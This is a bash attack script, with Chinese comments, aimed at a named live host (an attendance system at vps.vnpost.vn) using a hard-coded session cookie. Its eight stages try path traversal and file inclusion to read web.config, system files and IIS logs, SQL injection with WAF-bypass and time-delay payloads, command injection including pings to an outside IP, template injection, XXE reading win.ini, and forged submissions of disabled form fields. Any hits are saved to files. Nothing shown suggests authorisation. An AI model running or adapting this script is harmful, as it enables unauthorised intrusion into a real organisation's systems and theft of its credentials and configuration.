#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 全面绕过测试 - Chamcong系统"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ========================================
# 测试1: 路径遍历绕过
# ========================================
echo -e "\n[测试1] 路径遍历/目录穿越"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TRAVERSAL_PATHS=(
    "report/../../../web.config"
    "report/../../web.config"
    "report/../web.config"
    "../web.config"
    "../../web.config"
    "../../../web.config"
    "report/..%2f..%2fweb.config"
    "report/..%252f..%252fweb.config"
    "report/....//....//web.config"
    "report/..;/web.config"
)

for path in "${TRAVERSAL_PATHS[@]}"; do
    echo -n "  $path: "
    resp=$(curl -sk "${BASE}/${path}" -H "Cookie: $COOKIE" 2>&1)
    if echo "$resp" | grep -qi "connectionStrings\|appSettings\|configuration"; then
        echo "✅ 可能成功! (发现配置信息)"
        echo "$resp" > "traversal_success_$(echo $path | tr '/:.' '_').txt"
    else
        size=$(echo "$resp" | wc -c)
        echo "❌ 失败 (${size} bytes)"
    fi
done

# ========================================
# 测试2: SQL注入绕过 (WAF bypass)
# ========================================
echo -e "\n[测试2] SQL注入 - WAF绕过技术"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

SQL_BYPASS_PAYLOADS=(
    "MAU2'--"
    "MAU2'#"
    "MAU2'/**/"
    "MAU2'/**/--"
    "MAU2'%20--"
    "MAU2'%09--"
    "MAU2'%0a--"
    "MAU2'%0d--"
    "MAU2'%00--"
    "MAU2' aNd 1=1--"
    "MAU2' AnD 1=1--"
    "MAU2'||'1'='1"
    "MAU2'|'1'='1"
    "MAU2'^'0"
    "MAU2'or'1'='1"
    "MAU2'or'x'='x"
    "MAU2'%20or%20'1'='1"
    "MAU2'/**/or/**/1=1--"
    "MAU2';WAITFOR/**/DELAY/**/'0:0:5'--"
    "MAU2';WA/**/ITFOR/**/DE/**/LAY/**/'0:0:5'--"
)

for payload in "${SQL_BYPASS_PAYLOADS[@]}"; do
    echo -n "  $payload: "
    start_time=$(date +%s.%N)
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=$(echo $payload | sed 's/ /%20/g')" \
        -H "Cookie: $COOKIE" 2>&1)
    end_time=$(date +%s.%N)
    elapsed=$(echo "$end_time - $start_time" | bc)
    
    size=$(echo "$resp" | wc -c)
    
    # 检查时间延迟
    if (( $(echo "$elapsed > 4" | bc -l) )); then
        echo "✅ 时间盲注成功! (延时: ${elapsed}s)"
        echo "$payload" >> sql_time_blind_success.txt
    # 检查响应差异
    elif [ "$size" -gt 4000 ] && [ "$size" -lt 4300 ]; then
        echo "⚠️  正常响应 ($size bytes, ${elapsed}s)"
    elif [ "$size" -gt 0 ]; then
        echo "❓ 异常响应 ($size bytes, ${elapsed}s)"
    else
        echo "❌ 空响应 (${elapsed}s)"
    fi
done

# ========================================
# 测试3: 参数污染/覆盖
# ========================================
echo -e "\n[测试3] 参数污染 (HPP)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试多个ID参数
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2&ID=../../web.config" \
    -H "Cookie: $COOKIE" -o hpp_test1.html 2>&1
echo "  ID=MAU2&ID=../../web.config: $(wc -c < hpp_test1.html) bytes"

# 测试ID覆盖
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -H "Cookie: $COOKIE" \
    -H "X-Original-ID: ../../web.config" \
    -o hpp_test2.html 2>&1
echo "  X-Original-ID header: $(wc -c < hpp_test2.html) bytes"

# ========================================
# 测试4: 命令注入
# ========================================
echo -e "\n[测试4] 命令注入"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

CMD_PAYLOADS=(
    "MAU2;whoami"
    "MAU2|whoami"
    "MAU2\`whoami\`"
    "MAU2\$(whoami)"
    "MAU2&whoami"
    "MAU2&&whoami"
    "MAU2||whoami"
    "MAU2;ping 82.29.71.156"
    "MAU2|ping -n 5 82.29.71.156"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    echo -n "  $payload: "
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=$payload" \
        -H "Cookie: $COOKIE" 2>&1)
    
    if echo "$resp" | grep -qi "NT AUTHORITY\|C:\\\|Windows\|ping"; then
        echo "✅ 可能成功! (发现命令输出)"
        echo "$resp" > "cmd_injection_$(echo $payload | tr ' ;|&$()' '_').txt"
    else
        echo "❌ 失败"
    fi
done

# ========================================
# 测试5: SSTI (模板注入)
# ========================================
echo -e "\n[测试5] SSTI (Server-Side Template Injection)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

SSTI_PAYLOADS=(
    "{{7*7}}"
    "{{7*'7'}}"
    "<%= 7*7 %>"
    "${7*7}"
    "#{7*7}"
    "*{7*7}"
    "@(7*7)"
)

for payload in "${SSTI_PAYLOADS[@]}"; do
    echo -n "  $payload: "
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2&test=$payload" \
        -H "Cookie: $COOKIE" 2>&1)
    
    if echo "$resp" | grep -q "49\|7777777"; then
        echo "✅ 可能成功! (发现计算结果)"
        echo "$resp" > "ssti_success_$(echo $payload | tr '{}%#@*()' '_').txt"
    else
        echo "❌ 未发现"
    fi
done

# ========================================
# 测试6: XXE (XML外部实体注入)
# ========================================
echo -e "\n[测试6] XXE注入 (通过POST数据)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取ViewState
initial=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$initial" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)

XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'

curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -X POST \
    -H "Cookie: $COOKIE" \
    -H "Content-Type: application/xml" \
    --data "$XXE_PAYLOAD" \
    -o xxe_test.html 2>&1

echo "  XXE测试响应: $(wc -c < xxe_test.html) bytes"
if grep -qi "\[fonts\]\|\[extensions\]" xxe_test.html; then
    echo "  ✅ XXE成功! (读取到win.ini)"
else
    echo "  ❌ XXE失败"
fi

# ========================================
# 测试7: 文件包含 (LFI)
# ========================================
echo -e "\n[测试7] 本地文件包含 (LFI)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

LFI_TARGETS=(
    "c:/windows/win.ini"
    "c:/windows/system32/drivers/etc/hosts"
    "c:/inetpub/wwwroot/web.config"
    "../../web.config"
    "../web.config"
    "web.config"
    "/web.config"
    "c:/inetpub/logs/LogFiles/W3SVC1/u_ex$(date +%y%m%d).log"
)

for target in "${LFI_TARGETS[@]}"; do
    echo -n "  $target: "
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=$target" \
        -H "Cookie: $COOKIE" 2>&1)
    
    if echo "$resp" | grep -qi "\[fonts\]\|connectionStrings\|127.0.0.1"; then
        echo "✅ 成功读取!"
        echo "$resp" > "lfi_$(echo $target | tr '/:.' '_').txt"
    else
        echo "❌ 失败 ($(echo $resp | wc -c) bytes)"
    fi
done

# ========================================
# 测试8: 绕过disabled属性
# ========================================
echo -e "\n[测试8] 绕过disabled下拉框"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "ListDV=../../web.config" \
    --data-urlencode "ListBP=test" \
    --data-urlencode "ListTO=test" \
    --data-urlencode "btnIn=In" \
    -o bypass_disabled.html 2>&1

echo "  强制提交disabled参数: $(wc -c < bypass_disabled.html) bytes"
if grep -qi "connectionStrings\|appSettings" bypass_disabled.html; then
    echo "  ✅ 绕过成功!"
fi

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "全面绕过测试完成!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "检查成功的测试:"
ls -lh *success*.txt *lfi*.txt *cmd_injection*.txt *traversal*.txt 2>/dev/null | head -20
